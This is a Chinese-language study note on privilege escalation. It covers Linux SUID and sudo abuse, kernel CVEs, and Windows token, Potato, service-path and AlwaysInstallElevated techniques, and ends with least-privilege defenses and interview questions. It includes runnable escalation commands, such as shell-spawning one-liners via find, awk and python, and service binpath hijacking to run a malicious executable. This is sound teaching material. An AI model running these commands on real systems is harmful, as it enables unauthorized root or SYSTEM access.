# 特权提升 (Privilege Escalation)

## 版权声明

> **Copyright Notice**: 本文档为个人学习笔记，内容整理自公开技术资料、渗透测试报告及安全研究文献。引用内容均已标注来源。如有侵权请联系作者移除。
>
> **License**: 本笔记采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 知识共享许可协议 - 非商业性使用 - 相同方式共享。

---

## 概述

**特权提升 (Privilege Escalation)** 是指攻击者从较低权限账户获取更高权限的过程。这是渗透测试和安全评估中的关键阶段，也是防御者必须重点防护的攻击向量。

```
┌─────────────────────────────────────────────────────────────────┐
│                   特权提升类型                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   垂直特权提升 (Vertical Escalation)                            │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │      普通用户 ──────────────────────▶ 超级管理员         │   │
│   │      (alice)                         (root/admin)        │   │
│   │      攻击目标: 获取系统最高控制权                         │   │
│   │      常见方法: 内核漏洞、配置错误、SUID滥用              │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│   水平特权提升 (Horizontal Escalation)                          │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │      用户A ─────────────────────────▶ 用户B              │   │
│   │      (alice)                         (bob)               │   │
│   │      攻击目标: 访问其他用户的资源和数据                   │   │
│   │      常见方法: 会话劫持、IDOR漏洞、凭据窃取              │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Linux 特权提升技术

### SUID/SGID 滥用

SUID (Set User ID) 允许程序以文件所有者权限运行，是常见的提权向量。

```
┌─────────────────────────────────────────────────────────────────┐
│                   SUID 提权原理                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   SUID 权限位:                                                    │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  -rwsr-xr-x 1 root root 12345 Jan 1 00:00 /usr/bin/passwd│   │
│   │   │││                                                       │   │
│   │   ││└── 其他用户执行权限                                    │   │
│   │   │└─── 用户组执行权限                                       │   │
│   │   └──── SUID位 (s代替x)，程序以root权限运行                 │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│   提权原理:                                                       │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  普通用户alice执行 /usr/bin/passwd                       │   │
│   │  内核检查权限位，effective_uid = file.owner_uid (root)   │   │
│   │  程序以root权限执行，但仍有安全限制                      │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
│   危险SUID程序:                                                   │
│   • /bin/bash, /usr/bin/find, /usr/bin/vim                     │
│   • /usr/bin/nano, /usr/bin/less, /usr/bin/more                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**查找和利用 SUID 程序：**

```bash
# 查找系统上的SUID程序
$ find / -perm -4000 -type f 2>/dev/null

# 利用find提权
$ find /home -exec /bin/sh -p \;

# 利用vim提权
$ vim -c ":!bash"

# 利用less提权 (在less中按!然后输入bash)
```

### sudo 配置错误

sudoers 文件配置不当可导致权限提升。

```
┌─────────────────────────────────────────────────────────────────┐
│                   sudo 提权场景                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   危险的sudo配置:                                                 │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  # 危险1: 允许无密码执行shell                            │   │
│   │  alice ALL=(ALL) NOPASSWD: /bin/bash                     │   │
│   │  # 利用: sudo bash 直接获得root                          │   │
│   │                                                          │   │
│   │  # 危险2: 允许编辑敏感文件                               │   │
│   │  bob ALL=(root) NOPASSWD: /bin/vi /etc/hosts             │   │
│   │  # 在vi中: :set shell=/bin/bash                          │   │
│   │  #         :shell                                        │   │
│   │                                                          │   │
│   │  # 危险3: 允许执行通配符命令                             │   │
│   │  carol ALL=(root) NOPASSWD: /bin/tar -czf /backup/*      │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**GTFOBins 提权方法：**

```bash
# 检查sudo权限
$ sudo -l

# 利用awk提权
$ sudo awk "BEGIN {system(\"/bin/bash\")}"

# python提权
$ sudo python3 -c "import os; os.system(\"/bin/bash\")"

# 参考GTFOBins: https://gtfobins.github.io/
```

### 内核漏洞提权

```bash
# 检查系统信息
$ uname -a
$ cat /etc/os-release

# 著名内核漏洞:
# CVE-2016-5195 (Dirty COW)
# CVE-2021-4034 (PwnKit)
# CVE-2022-0847 (Dirty Pipe)

# 使用LinPEAS进行全面枚举
$ ./linpeas.sh

# 使用linux-exploit-suggester
$ ./linux-exploit-suggester.sh
```

---

## Windows 特权提升技术

### 令牌操纵

Windows 使用令牌(Token)表示用户身份和权限。

```
┌─────────────────────────────────────────────────────────────────┐
│                   Windows 令牌架构                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   特权 (Privileges):                                              │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  SeDebugPrivilege         - 调试权限                     │   │
│   │  SeImpersonatePrivilege   - 模拟客户端权限               │   │
│   │  SeAssignPrimaryToken     - 分配主令牌权限               │   │
│   │  SeTcbPrivilege           - 作为操作系统一部分           │   │
│   │  SeBackupPrivilege        - 备份权限                     │   │
│   │  SeLoadDriverPrivilege    - 加载驱动权限                 │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Windows 提权利用：**

```powershell
# 检查当前令牌特权
whoami /priv

# Potato家族提权 (SeImpersonatePrivilege)
# JuicyPotato, RoguePotato, SweetPotato, GodPotato

# PrintSpoofer (Windows 10/2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 服务配置错误

```powershell
# 使用PowerUp.ps1
Import-Module PowerUp.ps1
Invoke-AllChecks

# 查找未引号路径的服务
wmic service get name,displayname,pathname,startmode |
    findstr /i /v "C:\\Windows\\\" | findstr /i /v '"'

# 修改服务配置
sc config "ServiceName" binpath= "C:\\temp\\malicious.exe"
sc start "ServiceName"
```

### AlwaysInstallElevated

```powershell
# 检查AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer

# 如果都为0x1，可以创建恶意MSI提权
msiexec /quiet /qn /i C:\\temp\\malicious.msi
```

---

## 最小权限原则

```
┌─────────────────────────────────────────────────────────────────┐
│                   最小权限原则实施                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   Linux实施:                                                      │
│   □ 使用普通用户账户运行服务                                     │
│   □ 使用capabilities而非setuid                                   │
│   □ 启用SELinux/AppArmor限制                                     │
│   □ 使用chroot/container隔离                                     │
│   □ 限制sudo权限，使用绝对路径                                   │
│   □ 定期审计SUID程序                                             │
│                                                                 │
│   Windows实施:                                                    │
│   □ 使用受限令牌运行应用                                         │
│   □ 移除不必要的服务特权                                         │
│   □ 使用UAC并设置为最高级别                                      │
│   □ 配置AppLocker/WDAC限制可执行程序                             │
│   □ 使用Credential Guard保护凭据                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**防御配置示例：**

```bash
# 安全的sudoers配置
Cmnd_Alias WEB_CMDS = /usr/bin/systemctl restart nginx
webadmin ALL=(root) NOPASSWD: WEB_CMDS

# 限制SUID程序
find / -perm -4000 -type f -exec ls -la {} \;
chmod u-s /usr/bin/unnecessary_suid

# 使用capabilities替代setuid
setcap cap_net_bind_service=+ep /usr/bin/my-server
```

---

## 面试要点

**Q1: 什么是垂直特权提升和水平特权提升？**
> 垂直特权提升是从低权限用户获取更高权限（如user到root）；水平特权提升是获取同级其他用户的权限。垂直提权利用配置错误、漏洞或设计缺陷；水平提权利用IDOR、会话管理缺陷或凭据窃取。

**Q2: Linux下常见的提权方法有哪些？**
> 1) SUID/SGID程序滥用；2) sudo配置错误；3) 计划任务/可写脚本；4) 内核漏洞；5) PATH环境变量劫持；6) LD_PRELOAD注入；7) 敏感文件权限错误；8) Docker组权限。

**Q3: 什么是Potato提权？原理是什么？**
> Potato家族利用Windows的SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege。原理是诱使NT AUTHORITY\\SYSTEM账户连接到攻击者控制的COM服务端，然后窃取SYSTEM令牌并模拟，从而获得最高权限。

**Q4: 如何防止特权提升？**
> 1) 实施最小权限原则；2) 定期审计SUID程序和sudo配置；3) 及时修补系统和应用漏洞；4) 使用应用程序白名单；5) 启用完整性控制；6) 监控特权使用和异常行为。

---

## 参考资料

1. GTFOBins: https://gtfobins.github.io/
2. LOLBAS: https://lolbas-project.github.io/
3. LinPEAS / WinPEAS: https://github.com/carlospolop/PEASS-ng
4. MITRE ATT&CK - Privilege Escalation

## 相关概念

- [访问控制](./access-control.md) - 访问控制机制与权限管理
- [审计日志](./audit-logging.md) - 特权使用审计
- [内存安全](./memory-safety.md) - 内核漏洞提权的内存基础
- [身份认证](../authentication.md) - 认证绕过与提权
- [进程](../../computer-science/systems/process.md) - 进程权限与UID机制
- [内存管理](../../computer-science/systems/memory-management.md) - 内核内存布局
- [文件系统](../../computer-science/systems/file-systems.md) - 文件权限与SUID
- [安全启动](./secure-boot.md) - 启动时特权保护
- [沙箱机制](./sandboxing.md) - 特权隔离与限制
- [授权](../authorization.md) - 权限委托与检查
